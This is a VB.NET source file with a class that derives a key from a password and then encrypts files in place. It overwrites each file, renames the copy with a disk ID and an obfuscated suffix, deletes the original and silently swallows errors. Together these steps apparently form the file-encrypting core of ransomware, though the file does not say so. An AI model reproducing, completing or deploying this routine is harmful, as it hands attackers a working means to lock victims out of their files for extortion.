#Region "Imports"

Imports System.IO

#End Region

Public Class clsCrypto

    Public Shared Function GetKey(ByVal sPassword As String, ByVal iLenght As Integer) As Byte()

        Dim cData() As Char = sPassword.ToCharArray
        Dim iLength As Integer = cData.GetUpperBound(0)
        Dim bytDataToHash(iLength) As Byte

        For i As Integer = 0 To cData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(cData(i)))
        Next

        Dim bytResult As Byte() = mMain.InitSHA(bytDataToHash)
        Dim bytKey(iLenght) As Byte

        For i As Integer = 0 To iLenght
            bytKey(i) = bytResult(i)
        Next

        Return bytKey
    End Function


    Public Shared Sub Encrypt(ByVal sFileName As String, ByVal FirstKey As Byte(), ByVal SecondKey As Byte())
        Try
            Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(sFileName)
            Dim bytesEncrypted As Byte()
            Using ms As MemoryStream = New MemoryStream()
                clsS.csCs = mMain.InitCS(ms, FirstKey, SecondKey)
                clsS.csCs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                clsS.csCs.Close()
                bytesEncrypted = ms.ToArray
            End Using
            IO.File.WriteAllBytes(sFileName, bytesEncrypted)
            MsgBox(sFileName)
            System.IO.File.Copy(sFileName, sFileName + "[ID=" + clsS.hdd + "]" + Obf("lohg36GemJ6ki6AZx8BLiTYDIPny/N3Q"))
            System.IO.File.Delete(sFileName)

        Catch ex As UnauthorizedAccessException
        Catch ex As AccessViolationException
        Catch When Err.Number = clsS.FileNotFoundException
        Catch exep As Exception

        End Try
    End Sub
End Class
